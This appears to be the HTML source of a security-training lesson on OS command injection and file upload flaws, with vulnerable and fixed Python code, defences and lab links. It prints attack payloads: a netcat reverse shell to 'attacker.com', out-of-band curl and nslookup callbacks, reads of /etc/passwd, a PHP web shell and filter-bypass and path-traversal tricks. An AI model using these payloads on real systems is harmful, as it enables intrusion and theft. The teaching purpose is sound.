@@ -1,0 +1,230 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Command inj. &amp; uploads — Path 11 · KashSec Academy</title>
+<meta name="description" content="Two more injection-family bugs — both frequently lead to the most severe possible outcome in web security: full remote code execution (RCE) on the server itself.">
+<link rel="canonical" href="https://kashsec.vercel.app/#/lesson/11-web-security/cmd-and-upload">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🛡%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="Command inj. &amp; uploads — Path 11 · KashSec Academy">
+<meta property="og:description" content="Two more injection-family bugs — both frequently lead to the most severe possible outcome in web security: full remote code execution (RCE) on the server itself.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://kashsec.vercel.app/#/lesson/11-web-security/cmd-and-upload">
+<meta property="og:image" content="https://kashsec.vercel.app/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Command inj. &amp; uploads — Path 11 · KashSec Academy">
+<meta name="twitter:description" content="Two more injection-family bugs — both frequently lead to the most severe possible outcome in web security: full remote code execution (RCE) on the server itself.">
+<meta name="twitter:image" content="https://kashsec.vercel.app/og-image.png">
+<meta name="theme-color" content="#0A0E13">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"LearningResource","name":"Command inj. & uploads — Path 11 · KashSec Academy","description":"Two more injection-family bugs — both frequently lead to the most severe possible outcome in web security: full remote code execution (RCE) on the server itself.","url":"https://kashsec.vercel.app/#/lesson/11-web-security/cmd-and-upload","provider":{"@type":"Organization","name":"KashSec Academy","url":"https://kashsec.vercel.app"},"isAccessibleForFree":true,"learningResourceType":"Lesson"}
+</script>
+<style>
+:root{color-scheme:dark;--bg:#080A0F;--surface:#0F141E;--text:#EAEFF5;--muted:#94A3B2;--amber:#EFA43A;--teal:#5FE0CF;--border:rgba(255,255,255,.08)}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;line-height:1.6}
+main{max-width:760px;margin:0 auto;padding:1.5rem 1.2rem 3rem}
+.spa-notice{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1.1rem;margin-bottom:1.5rem;color:var(--muted);font-size:.88rem}
+.spa-notice a{color:var(--amber);text-decoration:none;font-weight:600}
+.crumb{color:var(--muted);font-size:.8rem;margin-bottom:.4rem}
+.crumb a{color:var(--teal);text-decoration:none}
+h1,h2,h3,h4{font-family:Inter,system-ui,sans-serif;color:var(--text)}
+h1{font-size:2rem;margin:.5rem 0 1rem}
+h2{font-size:1.4rem;margin:2rem 0 .8rem;padding-top:.6rem;border-top:1px solid var(--border)}
+a{color:var(--teal)}
+code{background:rgba(63,182,168,.13);color:var(--teal);padding:.1rem .35rem;border-radius:4px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9em}
+pre{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1rem;overflow-x:auto}
+pre code{background:transparent;color:var(--text);padding:0}
+blockquote{border-left:3px solid var(--amber);margin:1rem 0;padding:.4rem 1rem;color:var(--muted);background:var(--surface);border-radius:6px}
+table{width:100%;border-collapse:collapse;margin:1rem 0}
+th,td{border:1px solid var(--border);padding:.5rem .7rem;text-align:left}
+th{background:var(--surface)}
+img{max-width:100%;height:auto}
+footer{color:var(--muted);font-size:.82rem;text-align:center;margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style>
+</head>
+<body>
+<main>
+  <div class="spa-notice">📱 Loading the interactive KashSec app… If it doesn't switch automatically, <a href="https://kashsec.vercel.app/#/lesson/11-web-security/cmd-and-upload">continue here →</a></div>
+  <div class="crumb"><a href="/">KashSec Academy</a> · <a href="/">Path 11 — Web Security & Hacking</a> · Command inj. &amp; uploads</div>
+  <article><h1>Command injection &amp; file upload flaws</h1>
+<p>Two more injection-family bugs — both frequently lead to the most severe possible outcome in web security: <strong>full remote code execution (RCE)</strong> on the server itself.</p>
+<h2>Command injection</h2>
+<h3>The core idea</h3>
+<p>Just like SQL injection tricks a database interpreter, <strong>command injection</strong> tricks the operating system&#39;s shell interpreter — happening whenever an application passes user input into a system command without proper isolation.</p>
+<pre><code class="language-python"># VULNERABLE — user input concatenated into a shell command:
+import os
+hostname = request.form[&quot;hostname&quot;]
+os.system(f&quot;ping -c 4 {hostname}&quot;)
+</code></pre>
+<p>This looks harmless — a &quot;ping this host&quot; feature. But shells understand special characters that chain multiple commands together:</p>
+<pre><code>hostname: example.com; cat /etc/passwd
+hostname: example.com &amp;&amp; whoami
+hostname: example.com | nc attacker.com 4444 -e /bin/sh
+</code></pre>
+<p>The resulting shell command becomes:</p>
+<pre><code class="language-bash">ping -c 4 example.com; cat /etc/passwd
+</code></pre>
+<p>The <code>;</code> separates two commands — the shell runs <code>ping</code>, <strong>then</strong> runs <code>cat /etc/passwd</code>, printing the entire contents of a sensitive system file, invisible to the developer who only intended to allow pinging a hostname.</p>
+<h3>Shell metacharacters worth recognising</h3>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td>Run a second command regardless of the first&#39;s result</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>Run the second command only if the first succeeds</td>
+</tr>
+<tr>
+<td><code>||</code></td>
+<td>Run the second command only if the first fails</td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td>Pipe the first command&#39;s output into the second</td>
+</tr>
+<tr>
+<td><code>`</code> or <code>$()</code></td>
+<td>Command substitution — run and inline the result</td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>Run in background</td>
+</tr>
+</tbody></table>
+<h3>Finding command injection</h3>
+<p>Look for any feature that plausibly shells out to a system tool: ping/traceroute utilities, image conversion, PDF generation, file compression, DNS lookup tools, network diagnostics. Try:</p>
+<pre><code>; whoami
+| whoami
+` whoami `
+$(whoami)
+&amp; whoami &amp;
+</code></pre>
+<p>If any variant causes an unexpected delay, error, or leaks unexpected output, you&#39;ve likely found injectable command execution.</p>
+<h3>Blind command injection</h3>
+<p>Just like blind SQLi, sometimes there&#39;s no visible output — but you can still confirm execution using <strong>time delays</strong> or <strong>out-of-band callbacks</strong>:</p>
+<pre><code>; sleep 10
+$(sleep 10)
+; curl http://your-server.com/confirmed
+; nslookup $(whoami).your-collaborator-domain.com
+</code></pre>
+<p>Burp&#39;s <strong>Collaborator</strong> feature (Professional edition) automates exactly this out-of-band detection pattern — generating unique callback domains and monitoring for any DNS/HTTP interaction, proving execution even with zero visible output.</p>
+<h3>The fix</h3>
+<ul>
+<li><strong>Avoid shelling out entirely</strong> wherever possible — use language-native libraries instead of invoking system commands (e.g., a proper DNS library instead of shelling out to <code>nslookup</code>).</li>
+<li>If a system command is genuinely unavoidable, use APIs that pass arguments as a <strong>list</strong>, never a single interpolated string:</li>
+</ul>
+<pre><code class="language-python"># SAFE — arguments passed as a list, not through a shell:
+import subprocess
+hostname = request.form[&quot;hostname&quot;]
+result = subprocess.run([&quot;ping&quot;, &quot;-c&quot;, &quot;4&quot;, hostname], capture_output=True)
+</code></pre>
+<p>Passing arguments as a list (rather than a single shell-interpreted string) means metacharacters like <code>;</code> and <code>|</code> are treated as <strong>literal characters</strong> in the hostname argument, not as shell syntax — structurally similar to how parameterised queries defeat SQLi.</p>
+<ul>
+<li><strong>Strict allowlisting</strong> of expected input format (e.g., validate the input actually looks like a hostname/IP before using it at all) as an additional layer.</li>
+</ul>
+<h2>File upload vulnerabilities</h2>
+<h3>Why upload features are so dangerous</h3>
+<p>Any feature letting users upload files — profile pictures, documents, attachments — is a direct pathway for an attacker to place <strong>their own code</strong> onto your server, if not properly restricted.</p>
+<h3>The classic attack: uploading a web shell</h3>
+<p>If a server accepts file uploads and doesn&#39;t properly validate file type, an attacker uploads a script disguised as an image:</p>
+<pre><code class="language-php">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+</code></pre>
+<p>Saved as <code>shell.php</code> (or disguised as <code>shell.php.jpg</code>, <code>shell.phP</code>, or using other extension tricks to slip past weak filters). If the attacker can then <strong>access that uploaded file directly via URL</strong>, and the server executes PHP files in that directory:</p>
+<pre><code>http://target.com/uploads/shell.php?cmd=whoami
+</code></pre>
+<p>...they now have arbitrary command execution on the server, exactly like command injection — but delivered via file upload rather than a form field.</p>
+<h3>Common (weak) defences and their bypasses</h3>
+<table>
+<thead>
+<tr>
+<th>Weak defence</th>
+<th>Common bypass</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Checking file extension (<code>.jpg</code> only)</td>
+<td>Rename to <code>shell.php.jpg</code>, or use alternate PHP extensions (<code>.phtml</code>, <code>.php5</code>) some servers still execute</td>
+</tr>
+<tr>
+<td>Checking <code>Content-Type</code> header</td>
+<td>Attacker fully controls this header — trivially spoofed in the raw request via Burp</td>
+</tr>
+<tr>
+<td>Checking for image &quot;magic bytes&quot; at file start</td>
+<td>Prepend valid image magic bytes to a file that&#39;s still a working PHP script underneath — some parsers only check the very first few bytes</td>
+</tr>
+<tr>
+<td>Client-side JS validation</td>
+<td>Bypassed entirely — just intercept and modify the request in Burp, exactly like the client-vs-server lesson (Path 05.3) taught</td>
+</tr>
+</tbody></table>
+<h3>The correct defensive approach</h3>
+<ul>
+<li><strong>Store uploads outside the webroot</strong>, or on entirely separate, non-execution-capable storage (e.g., a dedicated object storage bucket) so uploaded files can <strong>never be directly executed</strong> as server-side code, no matter what they contain.</li>
+<li><strong>Rename uploaded files</strong> to random, server-generated names — never trust or preserve the original filename.</li>
+<li><strong>Validate file content properly</strong> — actually parse and re-encode images (e.g., open with an image library and re-save), rather than just checking headers/extensions, since a genuine re-encode strips out any embedded non-image payload.</li>
+<li><strong>Restrict execution permissions</strong> on the upload directory at the OS/web-server level, regardless of file content.</li>
+<li><strong>Set a strict <code>Content-Type</code>/<code>Content-Disposition</code></strong> on serving uploaded files so browsers download rather than execute/render them where inappropriate.</li>
+<li><strong>Virus/malware scanning</strong> on upload as an additional layer for user-generated content platforms.</li>
+</ul>
+<h2>Path traversal — the upload feature&#39;s other risk</h2>
+<p>Related to, but distinct from, uploading malicious file <em>content</em>, an insecure upload feature can also fail on the <strong>filename</strong> itself. If the server naively uses an attacker-supplied filename to decide where to save a file, a filename like <code>../../etc/cron.d/malicious</code> (a <strong>path traversal</strong> or &quot;directory traversal&quot; payload, using <code>../</code> to climb out of the intended upload directory) can let an attacker write files to arbitrary locations on the filesystem entirely — including sensitive locations like scheduled-task directories or web-accessible folders outside the intended uploads path. The same <code>../</code> technique also shows up independently of uploads, in any feature that reads a file based on user input (<code>GET /download?file=../../etc/passwd</code>), which is why filename and file-path handling deserves the same never-trust-the-client discipline as every other input in this lesson — validate that the resolved path still sits inside the intended directory before ever touching the filesystem.</p>
+<h2>Where these fit in the OWASP Top 10</h2>
+<p>Both command injection and unrestricted file upload fall under <strong>A03: Injection</strong> and <strong>A05: Security Misconfiguration</strong> territory from Path 11.1 — different delivery mechanisms, same underlying theme: <strong>untrusted input being interpreted somewhere it shouldn&#39;t be trusted.</strong></p>
+<h2>🧪 Lab — PortSwigger command injection &amp; file upload labs</h2>
+<ol>
+<li>Work through <a href="https://portswigger.net/web-security/os-command-injection">PortSwigger&#39;s OS command injection labs</a> — practise both visible and blind detection techniques.</li>
+<li>Then work through <a href="https://portswigger.net/web-security/file-upload">PortSwigger&#39;s File upload vulnerabilities labs</a> — practise the extension/content-type/magic-bytes bypass techniques described above, in a safe, legal, hosted environment.</li>
+</ol>
+<p>These labs let you safely practise techniques that would otherwise require setting up your own deliberately-vulnerable server — exactly the kind of hands-on repetition that builds real skill.</p>
+<p>A file upload feature checks the <code>Content-Type</code> header to ensure only <code>image/jpeg</code> or <code>image/png</code> are accepted. Why is this check, on its own, essentially worthless as a security control?</p>
+<details><summary>Show answer</summary>The <code>Content-Type</code> header is set entirely by the <strong>client</strong> (the browser or, more relevantly, an attacker using a proxy like Burp) and can be changed to any arbitrary value regardless of the file's actual content. An attacker simply intercepts the upload request and sets <code>Content-Type: image/jpeg</code> while the file body itself remains a fully functional malicious script — the header claims one thing while the bytes are something else entirely.</details><h2>Key terms</h2>
+<ul>
+<li><strong>Command injection</strong> — attacker input executed as an OS shell command.</li>
+<li><strong>Shell metacharacters</strong> — <code>;</code>, <code>&amp;&amp;</code>, <code>\|</code>, <code>`</code>, <code>$()</code> — used to chain or substitute commands.</li>
+<li><strong>Blind command injection</strong> — confirmed via time delays or out-of-band callbacks rather than visible output.</li>
+<li><strong>Web shell</strong> — a malicious script uploaded to gain remote command execution via file upload.</li>
+<li><strong>Magic bytes</strong> — the file-type-identifying bytes at the start of a file, sometimes spoofed.</li>
+</ul>
+<h2>Recap</h2>
+<ul>
+<li>Command injection tricks the OS shell into running attacker commands via unsanitised input passed to system calls.</li>
+<li>Pass command arguments as lists, never interpolated shell strings, to structurally prevent injection.</li>
+<li>File upload flaws let attackers plant executable code on the server if type/content isn&#39;t properly validated.</li>
+<li>Weak client-controlled checks (extension, Content-Type, shallow magic-byte checks) are all bypassable.</li>
+<li>Store uploads outside the webroot, rename files, and properly re-encode/validate content as real defences.</li>
+</ul>
+<h3>References</h3>
+<ul>
+<li><a href="https://portswigger.net/web-security/os-command-injection">PortSwigger — OS command injection</a> — free hands-on labs.</li>
+<li><a href="https://portswigger.net/web-security/file-upload">PortSwigger — File upload vulnerabilities</a> — free hands-on labs.</li>
+<li><a href="https://owasp.org/www-community/attacks/Command_Injection">OWASP Command Injection</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">OWASP File Upload Cheat Sheet</a></li>
+</ul>
+<p><strong>Next up →</strong> <a href="#/lesson/11-web-security/ssrf-and-auth">SSRF &amp; authentication flaws</a></p>
+</article>
+  <footer>© KashSec Academy · <a href="/">Interactive site</a> · <a href="/sitemap.xml">Sitemap</a></footer>
+</main>
+<script>
+// Redirect actual users into the SPA. Search-engine crawlers get to read
+// the content above before the redirect fires.
+(function(){
+  try {
+    var target = "https://kashsec.vercel.app/#/lesson/11-web-security/cmd-and-upload";
+    // Only redirect from the .html file, not from the SPA route itself.
+    if (location.pathname.endsWith('.html')) location.replace(target);
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
